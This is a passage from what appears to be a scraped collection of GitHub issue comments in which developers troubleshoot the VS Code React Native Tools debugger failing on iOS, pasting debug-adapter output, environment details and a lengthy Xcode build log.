'{'\",\"line\":15,\"column\":1,\"source\":\"\"}\n/Users/rardoz/Documents/ZARDOZ/apps/spellcaster-v2/node_modules/react-native/third-party/folly-2016.09.26.00/folly/docs/style.css: {\"reason\":\"missing '{'\",\"line\":8,\"column\":1,\"source\":\"\"}\n/Users/rardoz/Documents/ZARDOZ/apps/spellcaster-v2/node_modules/react-native/third-party/glog-0.3.4/doc/glog.html: {\"reason\":\"missing '{'\",\"line\":15,\"column\":1,\"source\":\"\"}\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n\n\naccepted connection from client\nOS: darwin x64\nAdapter node: v8.9.0 x64\nvscode-chrome-debug-core: 3.18.4\nFrom client: initialize({\"clientID\":\"vscode\",\"adapterID\":\"reactnative\",\"pathFormat\":\"path\",\"linesStartAt1\":true,\"columnsStartAt1\":true,\"supportsVariableType\":true,\"supportsVariablePaging\":true,\"supportsRunInTerminalRequest\":true,\"locale\":\"en-us\"})\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":1,\"command\":\"initialize\",\"success\":true,\"body\":{\"exceptionBreakpointFilters\":[{\"label\":\"All Exceptions\",\"filter\":\"all\",\"default\":false},{\"label\":\"Uncaught Exceptions\",\"filter\":\"uncaught\",\"default\":true}],\"supportsConfigurationDoneRequest\":true,\"supportsSetVariable\":true,\"supportsConditionalBreakpoints\":true,\"supportsCompletionsRequest\":true,\"supportsHitConditionalBreakpoints\":true,\"supportsRestartFrame\":true,\"supportsExceptionInfoRequest\":true,\"supportsDelayedStackTraceLoading\":true,\"supportsValueFormattingOptions\":true}}\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\nApplicationInsights:Sender\nArray[1]\n(node:42349) DeprecationWarning: os.tmpDir() is deprecated. Use os.tmpdir() instead.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\nCould not debug. ROBERT 1: {\"code\":-32603,\"message\":\"InternalError: Internal Error when calling 'Extension.launch'\",\"data\":\"Unknown error\"}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"terminated\"}\nFrom client: disconnect({\"restart\":false})\nshutdown ignored in server mode\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"output\",\"body\":{\"category\":\"telemetry\",\"output\":\"debugStopped\",\"data\":{\"reason\":\"Got disconnect request\"}}}\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":3,\"command\":\"disconnect\",\"success\":true}\nclient connection closed\n\n\nshutdown ignored in server mode\n\n\naccepted connection from client\nshutdown ignored in server mode\nOS: darwin x64\nshutdown ignored in server mode\nshutdown ignored in server mode\nshutdown ignored in server mode\nAdapter node: v8.9.0 x64\nvscode-chrome-debug-core: 3.18.4\nshutdown ignored in server mode\nshutdown ignored in server mode\nFrom client: initialize({\"clientID\":\"vscode\",\"adapterID\":\"reactnative\",\"pathFormat\":\"path\",\"linesStartAt1\":true,\"columnsStartAt1\":true,\"supportsVariableType\":true,\"supportsVariablePaging\":true,\"supportsRunInTerminalRequest\":true,\"locale\":\"en-us\"})\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":1,\"command\":\"initialize\",\"success\":true,\"body\":{\"exceptionBreakpointFilters\":[{\"label\":\"All Exceptions\",\"filter\":\"all\",\"default\":false},{\"label\":\"Uncaught Exceptions\",\"filter\":\"uncaught\",\"default\":true}],\"supportsConfigurationDoneRequest\":true,\"supportsSetVariable\":true,\"supportsConditionalBreakpoints\":true,\"supportsCompletionsRequest\":true,\"supportsHitConditionalBreakpoints\":true,\"supportsRestartFrame\":true,\"supportsExceptionInfoRequest\":true,\"supportsDelayedStackTraceLoading\":true,\"supportsValueFormattingOptions\":true}}\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\n[vsmobile.vscode-react-native] Accessing a resource scoped configuration without providing a resource is not expected. To get the effective value for 'react-native-tools.logLevel', provide the URI of a resource or 'null' for any resource.\nCould not debug. ROBERT 1: {\"code\":-32603,\"message\":\"InternalError: Internal Error when calling 'Extension.launch'\",\"data\":\"Unknown error\"}\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"terminated\"}\nFrom client: disconnect({\"restart\":false})\nshutdown ignored in server mode\nTo client: {\"seq\":0,\"type\":\"event\",\"event\":\"output\",\"body\":{\"category\":\"telemetry\",\"output\":\"debugStopped\",\"data\":{\"reason\":\"Got disconnect request\"}}}\nTo client: {\"seq\":0,\"type\":\"response\",\"request_seq\":3,\"command\":\"disconnect\",\"success\":true}\nclient connection closed\n\n\nshutdown ignored in server mode\n```. I will look into this more tomorrow. But I think the error is between these functions in parse-engine-gateway.js\nfunction createSimpleTextDocument(uri) {\n    return __awaiter(this, void 0, void 0, function* () {\n        let text = yield readFile(uri.fsPath);\n        let simpleDocument = {\n            languageId: uri.fsPath.split('.').pop(),\n            getText() {\n                return text;\n            }\n        };\n        return simpleDocument;\n    });\n}\nclass ParseEngineGateway {\n    static callParser(uri) {\n        return __awaiter(this, void 0, void 0, function* () {\n            let textDocument = yield createSimpleTextDocument(uri);\n            let parseEngine = parse_engine_registry_1.default.getParseEngine(textDocument.languageId);\n            let cssClassDefinitions = yield parseEngine.parse(textDocument);\n            return cssClassDefinitions;\n        });\n    }\n}. Its working again. Thanks for your help guys!. ",
    "atkit": "I also noticed the same problem on react-native 0.50.x, and it works find on 0.49.x - may be something changed in a way it works on 0.50.. @iTOYS for some reason I'm not getting any logs from there, do I need to reload extension somehow after change?. @iTOYS I think I figure out, here is an output of error: \n{\"code\":-32603,\"message\":\"InternalError: Internal Error when calling 'Extension.launch'\",\"data\":\"Unknown error\"}\nHappens on line 60.\nP.S. I just created new app with react-native init and tried to run it. \n```\nEnvironment:\n  OS: macOS High Sierra 10.13.1\n  Node: 8.6.0\n  Yarn: 1.2.1\n  npm: 5.4.2\n  Watchman: 4.9.0\n  Xcode: Xcode 9.1 Build version 9B55\n  Android Studio: 3.0 AI-171.4408382\nPackages: (wanted => installed)\n  react: 16.0.0 => 16.0.0\n  react-native: 0.50.3 => 0.50.3\n```. @iTOYS issue on iOS still exist, on Android I never run it from VSCode honestly. (but I will try tomorrow). Works for me as well, thank you. ",
    "ishiestar": "I am still getting the following when I try to debug on iOS:\nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.18.5\nCould not debug. Unknown error: not all success patterns were matched\n\nI am using 0.5.7 of React Native Tools extension and react-native-cli: 2.0.1, react-native: 0.47.2. Please help!. Hello @iTOYS \nHere is the complete output of React Native: Run Ios:\n```\n[Info] Starting Packager\nScanning 609 folders for symlinks in /Users/dummy/projects/app_name/node_modules (6ms)\n \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \n \u2502  Running packager on port 8081.                                            \u2502 \n \u2502                                                                            \u2502 \n \u2502  Keep this packager running while developing on any JS projects. Feel      \u2502 \n \u2502  free to close this tab and run your own packager instance if you          \u2502 \n \u2502  prefer.                                                                   \u2502 \n \u2502                                                                            \u2502 \n \u2502  https://github.com/facebook/react-native                                  \u2502 \n \u2502                                                                            \u2502 \n \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \nLooking for JS files in\n   /Users/dummy/projects/app_name \nReact packager ready.\nLoading dependency graph, done.\n[Info] Packager started.\n[Info] Prewarming bundle cache. This may take a while ...\n[Info] About to get: http://localhost:8081/index.ios.bundle?platform=ios\nBundling index.ios.js  [development, non-minified, hmr disabled]  100.0% (745/745), done.\n[Warning] The Bundle Cache was prewarmed.\n[Info] Building and running application.\nBundling index.ios.js  [development, non-minified, hmr disabled]  100.0% (745/745), done.\n[Error] Error: Unknown error: not all success patterns were matched\n```. Yes, @iTOYS really sorry. Here is the correct output:\n```\n[Info] Starting React Native Packager.\n[Info] Attaching to running React Native packager\nScanning 609 folders for symlinks in /Users/dummy/projects/app_name/node_modules (6ms)\nFound Xcode workspace AppName.xcworkspace\nCoreData: annotation:  Failed to load optimized model at path '/Applications/Xcode.app/Contents/Applications/Instruments.app/Contents/Frameworks/InstrumentsPackaging.framework/Versions/A/Resources/XRPackageModel.momd/8.3 v2.omo'\nWe couldn't boot your defined simulator due to an already booted simulator. We are limited to one simulator launched at a time.\nLaunching iPhone 5s (iOS 10.3)...\nBuilding using \"xcodebuild -workspace AppName.xcworkspace -configuration Debug -scheme AppName -destination id=ECCE2E54-8C88-4298-8240-ABDE96287E1E -derivedDataPath build\"\nUser defaults from command line:\nIDEDerivedDataPathOverride = /Users/dummy/projects/app_name/ios/build\n\n=== BUILD TARGET yoga OF PROJECT React WITH CONFIGURATION Debug ===\nCheck dependencies\n=== BUILD TARGET double-conversion OF PROJECT React WITH CONFIGURATION Debug ===\nCheck dependencies\nPhaseScriptExecution Install\\ Third\\ Party /Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/Script-190EE32F1E6A43DE00A8543A.sh\n    cd /Users/dummy/projects/app_name/node_modules/react-native/React\n    export ACTION=build\n    export AD_HOC_CODE_SIGNING_ALLOWED=YES\n    export ALTERNATE_GROUP=staff\n    export ALTERNATE_MODE=u+w,go-w,a+rX\n    export ALTERNATE_OWNER=dummy\n    export ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES=NO\n    export ALWAYS_SEARCH_USER_PATHS=NO\n    export ALWAYS_USE_SEPARATE_HEADERMAPS=NO\n    export APPLE_INTERNAL_DEVELOPER_DIR=/AppleInternal/Developer\n    export APPLE_INTERNAL_DIR=/AppleInternal\n    export APPLE_INTERNAL_DOCUMENTATION_DIR=/AppleInternal/Documentation\n    export APPLE_INTERNAL_LIBRARY_DIR=/AppleInternal/Library\n    export APPLE_INTERNAL_TOOLS=/AppleInternal/Developer/Tools\n    export APPLICATION_EXTENSION_API_ONLY=NO\n    export APPLY_RULES_IN_COPY_FILES=NO\n    export ARCHS=x86_64\n    export ARCHS_STANDARD=\"i386 x86_64\"\n    export ARCHS_STANDARD_32_64_BIT=\"i386 x86_64\"\n    export ARCHS_STANDARD_32_BIT=i386\n    export ARCHS_STANDARD_64_BIT=x86_64\n    export ARCHS_STANDARD_INCLUDING_64_BIT=\"i386 x86_64\"\n    export ARCHS_UNIVERSAL_IPHONE_OS=\"i386 x86_64\"\n    export AVAILABLE_PLATFORMS=\"appletvos appletvsimulator iphoneos iphonesimulator macosx watchos watchsimulator\"\n    export BITCODE_GENERATION_MODE=marker\n    export BUILD_ACTIVE_RESOURCES_ONLY=YES\n    export BUILD_COMPONENTS=\"headers build\"\n    export BUILD_DIR=/Users/dummy/projects/app_name/ios/build/Build/Products\n    export BUILD_ROOT=/Users/dummy/projects/app_name/ios/build/Build/Products\n    export BUILD_STYLE=\n    export BUILD_VARIANTS=normal\n    export BUILT_PRODUCTS_DIR=/Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator\n    export CACHE_ROOT=/var/folders/gw/wxwr344n4gj3phyt48pzhth80000gn/C/com.apple.DeveloperTools/8.3.3-8E3004b/Xcode\n    export CCHROOT=/var/folders/gw/wxwr344n4gj3phyt48pzhth80000gn/C/com.apple.DeveloperTools/8.3.3-8E3004b/Xcode\n    export CHMOD=/bin/chmod\n    export CHOWN=/usr/sbin/chown\n    export CLANG_ANALYZER_NONNULL=YES\n    export CLANG_CXX_LANGUAGE_STANDARD=gnu++0x\n    export CLANG_CXX_LIBRARY=libc++\n    export CLANG_ENABLE_MODULES=YES\n    export CLANG_ENABLE_MODULE_DEBUGGING=NO\n    export CLANG_ENABLE_OBJC_ARC=YES\n    export CLANG_MODULES_BUILD_SESSION_FILE=/Users/dummy/projects/app_name/ios/build/ModuleCache/Session.modulevalidation\n    export CLANG_WARN_BOOL_CONVERSION=YES\n    export CLANG_WARN_CONSTANT_CONVERSION=YES\n    export CLANG_WARN_DIRECT_OBJC_ISA_USAGE=YES_ERROR\n    export CLANG_WARN_DOCUMENTATION_COMMENTS=YES\n    export CLANG_WARN_EMPTY_BODY=YES\n    export CLANG_WARN_ENUM_CONVERSION=YES\n    export CLANG_WARN_INFINITE_RECURSION=YES\n    export CLANG_WARN_INT_CONVERSION=YES\n    export CLANG_WARN_OBJC_ROOT_CLASS=YES_ERROR\n    export CLANG_WARN_SUSPICIOUS_MOVE=YES\n    export CLANG_WARN_SUSPICIOUS_MOVES=YES\n    export CLANG_WARN_UNREACHABLE_CODE=YES\n    export CLANG_WARN__DUPLICATE_METHOD_MATCH=YES\n    export CLASS_FILE_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/JavaClasses\n    export CLEAN_PRECOMPS=YES\n    export CLONE_HEADERS=NO\n    export CODESIGNING_FOLDER_PATH=/Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/libdouble-conversion.a\n    export CODE_SIGNING_ALLOWED=NO\n    export CODE_SIGNING_REQUIRED=YES\n    export CODE_SIGN_CONTEXT_CLASS=XCiPhoneSimulatorCodeSignContext\n    export CODE_SIGN_IDENTITY=-\n    export COLOR_DIAGNOSTICS=NO\n    export COMBINE_HIDPI_IMAGES=NO\n    export COMMAND_MODE=legacy\n    export COMPOSITE_SDK_DIRS=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/CompositeSDKs\n    export COMPRESS_PNG_FILES=YES\n    export CONFIGURATION=Debug\n    export CONFIGURATION_BUILD_DIR=/Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator\n    export CONFIGURATION_TEMP_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator\n    export COPYING_PRESERVES_HFS_DATA=NO\n    export COPY_HEADERS_RUN_UNIFDEF=NO\n    export COPY_PHASE_STRIP=NO\n    export COPY_RESOURCES_FROM_STATIC_FRAMEWORKS=YES\n    export CORRESPONDING_DEVICE_PLATFORM_DIR=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform\n    export CORRESPONDING_DEVICE_PLATFORM_NAME=iphoneos\n    export CORRESPONDING_DEVICE_SDK_DIR=/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS10.3.sdk\n    export CORRESPONDING_DEVICE_SDK_NAME=iphoneos10.3\n    export CP=/bin/cp\n    export CREATE_INFOPLIST_SECTION_IN_BINARY=NO\n    export CURRENT_ARCH=x86_64\n    export CURRENT_VARIANT=normal\n    export DEAD_CODE_STRIPPING=YES\n    export DEBUGGING_SYMBOLS=YES\n    export DEBUG_INFORMATION_FORMAT=dwarf\n    export DEFAULT_COMPILER=com.apple.compilers.llvm.clang.1_0\n    export DEFAULT_KEXT_INSTALL_PATH=/System/Library/Extensions\n    export DEFINES_MODULE=NO\n    export DEPLOYMENT_LOCATION=NO\n    export DEPLOYMENT_POSTPROCESSING=NO\n    export DEPLOYMENT_TARGET_CLANG_ENV_NAME=IPHONEOS_DEPLOYMENT_TARGET\n    export DEPLOYMENT_TARGET_CLANG_FLAG_NAME=mios-simulator-version-min\n    export DEPLOYMENT_TARGET_CLANG_FLAG_PREFIX=-mios-simulator-version-min=\n    export DEPLOYMENT_TARGET_SETTING_NAME=IPHONEOS_DEPLOYMENT_TARGET\n    export DEPLOYMENT_TARGET_SUGGESTED_VALUES=\"8.0 8.1 8.2 8.3 8.4 9.0 9.1 9.2 9.3 10.0 10.1 10.2 10.3\"\n    export DERIVED_FILES_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/DerivedSources\n    export DERIVED_FILE_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/DerivedSources\n    export DERIVED_SOURCES_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/DerivedSources\n    export DEVELOPER_APPLICATIONS_DIR=/Applications/Xcode.app/Contents/Developer/Applications\n    export DEVELOPER_BIN_DIR=/Applications/Xcode.app/Contents/Developer/usr/bin\n    export DEVELOPER_DIR=/Applications/Xcode.app/Contents/Developer\n    export DEVELOPER_FRAMEWORKS_DIR=/Applications/Xcode.app/Contents/Developer/Library/Frameworks\n    export DEVELOPER_FRAMEWORKS_DIR_QUOTED=/Applications/Xcode.app/Contents/Developer/Library/Frameworks\n    export DEVELOPER_LIBRARY_DIR=/Applications/Xcode.app/Contents/Developer/Library\n    export DEVELOPER_SDK_DIR=/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs\n    export DEVELOPER_TOOLS_DIR=/Applications/Xcode.app/Contents/Developer/Tools\n    export DEVELOPER_USR_DIR=/Applications/Xcode.app/Contents/Developer/usr\n    export DEVELOPMENT_LANGUAGE=English\n    export DEVELOPMENT_TEAM=V9WTTPBFK9\n    export DO_HEADER_SCANNING_IN_JAM=NO\n    export DSTROOT=/tmp/React.dst\n    export DT_TOOLCHAIN_DIR=/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain\n    export DWARF_DSYM_FILE_NAME=libdouble-conversion.a.dSYM\n    export DWARF_DSYM_FILE_SHOULD_ACCOMPANY_PRODUCT=NO\n    export DWARF_DSYM_FOLDER_PATH=/Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator\n    export EFFECTIVE_PLATFORM_NAME=-iphonesimulator\n    export EMBEDDED_CONTENT_CONTAINS_SWIFT=NO\n    export EMBED_ASSET_PACKS_IN_PRODUCT_BUNDLE=NO\n    export ENABLE_BITCODE=NO\n    export ENABLE_DEFAULT_HEADER_SEARCH_PATHS=YES\n    export ENABLE_HEADER_DEPENDENCIES=YES\n    export ENABLE_ON_DEMAND_RESOURCES=NO\n    export ENABLE_STRICT_OBJC_MSGSEND=YES\n    export ENABLE_TESTABILITY=YES\n    export ENTITLEMENTS_REQUIRED=YES\n    export EXCLUDED_INSTALLSRC_SUBDIRECTORY_PATTERNS=\".DS_Store .svn .git .hg CVS\"\n    export EXCLUDED_RECURSIVE_SEARCH_PATH_SUBDIRECTORIES=\".nib .lproj .framework .gch .xcode .xcassets () .DS_Store CVS .svn .git .hg .pbproj .pbxproj\"\n    export EXECUTABLE_EXTENSION=a\n    export EXECUTABLE_NAME=libdouble-conversion.a\n    export EXECUTABLE_PATH=libdouble-conv\nersion.a\n    export EXECUTABLE_PREFIX=lib\n    export EXECUTABLE_SUFFIX=.a\n    export EXPANDED_CODE_SIGN_IDENTITY=\n    export EXPANDED_CODE_SIGN_IDENTITY_NAME=\n    export EXPANDED_PROVISIONING_PROFILE=\n    export FILE_LIST=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/Objects/LinkFileList\n    export FIXED_FILES_DIR=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/FixedFiles\n    export FRAMEWORK_FLAG_PREFIX=-framework\n    export FRAMEWORK_SEARCH_PATHS=\"/Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator \"\n    export FRAMEWORK_VERSION=A\n    export FULL_PRODUCT_NAME=libdouble-conversion.a\n    export GCC3_VERSION=3.3\n    export GCC_C_LANGUAGE_STANDARD=gnu99\n    export GCC_DYNAMIC_NO_PIC=NO\n    export GCC_NO_COMMON_BLOCKS=YES\n    export GCC_OBJC_LEGACY_DISPATCH=YES\n    export GCC_OPTIMIZATION_LEVEL=0\n    export GCC_PFE_FILE_C_DIALECTS=\"c objective-c c++ objective-c++\"\n    export GCC_PREPROCESSOR_DEFINITIONS=\"DEBUG=1 RCT_DEBUG=1 RCT_DEV=1 RCT_NSASSERT=1\"\n    export GCC_SYMBOLS_PRIVATE_EXTERN=NO\n    export GCC_TREAT_WARNINGS_AS_ERRORS=NO\n    export GCC_VERSION=com.apple.compilers.llvm.clang.1_0\n    export GCC_VERSION_IDENTIFIER=com_apple_compilers_llvm_clang_1_0\n    export GCC_WARN_64_TO_32_BIT_CONVERSION=YES\n    export GCC_WARN_ABOUT_MISSING_PROTOTYPES=YES\n    export GCC_WARN_ABOUT_RETURN_TYPE=YES_ERROR\n    export GCC_WARN_INITIALIZER_NOT_FULLY_BRACKETED=YES\n    export GCC_WARN_SHADOW=YES\n    export GCC_WARN_UNDECLARED_SELECTOR=YES\n    export GCC_WARN_UNINITIALIZED_AUTOS=YES_AGGRESSIVE\n    export GCC_WARN_UNUSED_FUNCTION=YES\n    export GCC_WARN_UNUSED_VARIABLE=YES\n    export GENERATE_MASTER_OBJECT_FILE=NO\n    export GENERATE_PKGINFO_FILE=NO\n    export GENERATE_PROFILING_CODE=NO\n    export GENERATE_TEXT_BASED_STUBS=NO\n    export GID=20\n    export GROUP=staff\n    export HEADERMAP_INCLUDES_FLAT_ENTRIES_FOR_TARGET_BEING_BUILT=YES\n    export HEADERMAP_INCLUDES_FRAMEWORK_ENTRIES_FOR_ALL_PRODUCT_TYPES=YES\n    export HEADERMAP_INCLUDES_NONPUBLIC_NONPRIVATE_HEADERS=YES\n    export HEADERMAP_INCLUDES_PROJECT_HEADERS=YES\n    export HEADERMAP_USES_FRAMEWORK_PREFIX_ENTRIES=YES\n    export HEADERMAP_USES_VFS=NO\n    export HEADER_SEARCH_PATHS=\"/Users/dummy/projects/app_name/ios/build/Build/Products/Debug-iphonesimulator/include \"\n    export HIDE_BITCODE_SYMBOLS=YES\n    export HOME=/Users/dummy\n    export ICONV=/usr/bin/iconv\n    export INFOPLIST_EXPAND_BUILD_SETTINGS=YES\n    export INFOPLIST_OUTPUT_FORMAT=binary\n    export INFOPLIST_PREPROCESS=NO\n    export INLINE_PRIVATE_FRAMEWORKS=NO\n    export INSTALLHDRS_COPY_PHASE=NO\n    export INSTALLHDRS_SCRIPT_PHASE=NO\n    export INSTALL_DIR=/tmp/React.dst/usr/local/lib\n    export INSTALL_GROUP=staff\n    export INSTALL_MODE_FLAG=u+w,go-w,a+rX\n    export INSTALL_OWNER=dummy\n    export INSTALL_PATH=/usr/local/lib\n    export INSTALL_ROOT=/tmp/React.dst\n    export IPHONEOS_DEPLOYMENT_TARGET=8.0\n    export JAVAC_DEFAULT_FLAGS=\"-J-Xms64m -J-XX:NewSize=4M -J-Dfile.encoding=UTF8\"\n    export JAVA_APP_STUB=/System/Library/Frameworks/JavaVM.framework/Resources/MacOS/JavaApplicationStub\n    export JAVA_ARCHIVE_CLASSES=YES\n    export JAVA_ARCHIVE_TYPE=JAR\n    export JAVA_COMPILER=/usr/bin/javac\n    export JAVA_FRAMEWORK_RESOURCES_DIRS=Resources\n    export JAVA_JAR_FLAGS=cv\n    export JAVA_SOURCE_SUBDIR=.\n    export JAVA_USE_DEPENDENCIES=YES\n    export JAVA_ZIP_FLAGS=-urg\n    export JIKES_DEFAULT_FLAGS=\"+E +OLDCSO\"\n    export KEEP_PRIVATE_EXTERNS=NO\n    export LD_DEPENDENCY_INFO_FILE=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/Objects-normal/x86_64/double-conversion_dependency_info.dat\n    export LD_GENERATE_MAP_FILE=NO\n    export LD_MAP_FILE_PATH=/Users/dummy/projects/app_name/ios/build/Build/Intermediates/React.build/Debug-iphonesimulator/double-conversion.build/double-conversion-LinkMap-normal-x86_64.txt\n    export LD_NO_PIE=NO\n    export 